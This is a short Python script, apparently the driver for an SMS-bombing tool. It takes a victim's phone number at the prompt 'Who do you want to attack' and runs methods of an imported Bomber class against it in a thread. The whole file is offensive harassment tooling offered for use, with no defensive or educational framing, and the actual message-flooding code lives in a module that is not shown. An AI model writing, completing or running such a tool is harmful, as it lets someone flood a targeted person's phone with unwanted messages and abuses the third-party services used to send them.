# encoding=utf8
# attack.py
from smsbomber import Bomber
import threading

def attack1(phone):
    func = ['func%d' %i for i in range(0, 2)]
    for i in func:
        if hasattr(Bomber,i):
            try:
                getattr(Bomber(phone),i)()
                print('%s has excuted!' %i)
            except:
                print('%s meet some problems!' %i)
                continue
        else:
            print('There is not %s' %i)


phone = input('Who do you want to attack:').strip()
# phone = '01234567890'
thread1 = threading.Thread(target=attack1,name='thread1',args=(phone,))
# threading.current_thread().name
thread1.start()

print('Good Bye!')
